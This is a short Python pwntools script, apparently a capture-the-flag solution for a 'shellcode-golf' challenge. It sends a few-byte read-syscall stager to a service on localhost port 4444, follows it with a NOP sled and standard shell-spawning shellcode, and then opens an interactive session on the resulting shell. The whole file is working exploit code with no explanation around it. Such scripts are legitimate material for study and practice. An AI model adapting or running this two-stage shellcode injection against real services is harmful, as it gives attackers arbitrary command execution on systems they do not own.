from pwn import *
import time

context.arch = 'x86_64'

elf = ELF('./shellcode-golf')

initial = asm('xchg %esi,%edx;xor %edi,%edi;syscall')
payload = asm('nop') * 10 + asm(shellcraft.sh())

print("initial payload is", len(initial), "bytes")

# p = elf.debug()
# p = elf.process()
# p = process('./shellcode-golf')
p = remote('localhost', 4444)

p.sendline(initial)
time.sleep(.5)
p.sendline(payload)

p.interactive()
